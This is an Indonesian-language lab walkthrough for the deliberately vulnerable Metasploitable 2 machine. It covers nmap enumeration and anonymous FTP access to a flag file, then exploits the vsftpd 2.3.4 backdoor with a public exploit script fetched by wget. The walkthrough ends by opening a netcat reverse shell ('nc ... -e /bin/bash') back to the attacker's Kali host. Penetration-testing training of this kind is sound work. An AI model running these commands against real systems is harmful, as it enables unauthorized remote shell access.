# Metasploitable 2

## NMAP Scan
```
nmap -sC -sV <ip_target>
```
> -sC = Menjalankan default enumeration script
-sV = Mengecek versi dari setiap service yang up

Dari hasil NMAP ditemukan berbagai macam port yang open. Mengacu pada Metode Uji Ringkas, kita akan prioritaskan service yang memiliki akses langsung ke server, dalam hal ini terdapat FTP pada Port 21.

## FTP Anonymous login
Dari hasil scan ditemukan terdapat FTP service running pada port 21, dengan Anonymous login allowed. Didalam FTP tersebut terdapat file check_me.txt, maka kita coba untuk download file tersebut.
```
$ sudo nmap -sC -sV 10.0.2.4
.
.
.
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              20 Jun 26 16:02 check_me.txt
| ftp-syst:
|   STAT:
.
.

```
```
ftp <ip_target>
Username = Anonymous
Password = <Bebas, silahkan langsung di enter saja>
```

Untuk melist file di dalam FTP, gunakan command ls
```
ls
```

Kemudian download file check_me.txt menggunakan command get
```
get check_me.txt
exit
```

Kemudian baca file check_me.txt tersebut. Flag dapat disubmit ke platform ctf di https://104.198.70.58

## VSFTPD Exploit
Mengacu kembali kepada metode uji ringkas, setelah mengecek komponen utama "Configuration" dengan login ke FTP Anonymous login, selanjutnya kita lakukan uji pada komponen "Outdated Version".

Kita ketahui, dari hasil NMAP, versi FTP yang digunakan adalah VSFTPD 2.3.4 . Selanjutnya kita coba lakukan googling untuk mencari adanya kerentanan dan public exploit versi vsftpd tersebut.

```
Googling : VSFTPD 2.3.4 Exploit
```
Source utama yang kita cari adalah pada exploit-db.com dan github. Pertama, kita temukan eksploit pada exploit-db, namun exploit tersebut belum verified, sehingga ada kemungkinan exploit tersebut tidak berjalan sebagaimana mestinya. Selanjutnya, kita temukan exploit pada github milik ahervias77. Selanjutnya kita download exploit tersebut.

```
wget https://raw.githubusercontent.com/ahervias77/vsftpd-2.3.4-exploit/master/vsftpd_234_exploit.py
```

Next, kita coba jalankan exploitnya

```
python3 vsftpd_234_exploit.py
```
Terlihat cara penggunaan dari exploit tersebut adalah :
```
Usage: ./vsftpd_234_exploit.py <IP address> <port> <command>
Example: ./vsftpd_234_exploit.py 192.168.1.10 21 whoami
```
Kemudian kita exploit :
```
python3 vsftpd_234_exploit.py 10.0.2.4 21 whoami
```
Berhasil!

Selanjutnya kita establish reverse shell , pertama buat listener terlebih dahulu di Kali:
```
nc -nlvp 4444
```
Execute exploit dengan reverse shell commands
```
python3 vsftpd_234_exploit.py 10.0.2.4 21 "nc -nv <IP_Kali> 4444 -e /bin/bash"
```

Upgrade ke interactive shell (Cek Cheat Sheet)

Ambil flag

Selesai!
